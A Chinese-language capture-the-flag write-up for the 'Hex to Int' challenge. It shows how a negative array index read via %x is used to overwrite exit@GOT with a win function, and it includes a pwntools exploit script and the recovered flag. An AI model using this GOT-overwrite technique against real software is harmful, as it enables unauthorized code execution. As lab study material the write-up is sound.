# Hex to Int

## 题目简述

程序维护一个全局 `int table[0xffff]`。菜单允许用 `%x` 读入索引并执行 `table[idx] = val`，但没有检查索引是否为负数或是否小于数组长度；退出路径会调用 `exit`，二进制还包含执行 `/bin/sh` 的 `win` 函数。目标是通过越界数组写覆盖 `exit@GOT`。

## 解题过程

全局数组与 GOT 的相对位置固定。查看符号地址后可知 `exit@GOT` 位于 `table` 起点之前 14 个 `int`，所以目标索引为 $-14$。输入通过 `scanf("%x", &idx)` 解析到有符号 `int` 中，可发送其 32 位补码十六进制表示：

```python
from pwn import *

elf = context.binary = ELF("./hex_to_int2")
p = process(elf.path)

win = elf.sym.win
neg14 = hex((-14) & 0xffffffff).encode()

p.sendlineafter(b"expand the table (2)?.\n", b"2")
p.sendlineafter(b"to add: ", neg14)
p.sendlineafter(b"value?\n", str(win & 0xffffffff).encode())
```

赋值实际落点为：

$$
\text{table}+(-14)\times4=\text{exit@GOT}.
$$

二进制以非 PIE 方式编译，`win` 地址固定且写入一个 32 位 `int` 即可。随后选择任意非法菜单项触发 `exit(0)`，GOT 跳转目标已经变为 `win`，从而获得 shell 并读取：

```text
byuctf{0v3rwr1t1ng_t00??_3e2d88}
```

## 方法总结

- 核心技巧：利用负索引进行全局数组越界写，将可控整数写入邻近 GOT 表项。
- 识别信号：数组索引只由 `%x`/`%d` 读入却不检查上下界，同时存在可触发的 GOT 调用和 `win` 函数。
- 复用要点：先用符号地址精确计算 `(target - table) / sizeof(element)`；负值经 `%x` 输入时要发送对应宽度的补码，而不是字符串 `-14`。
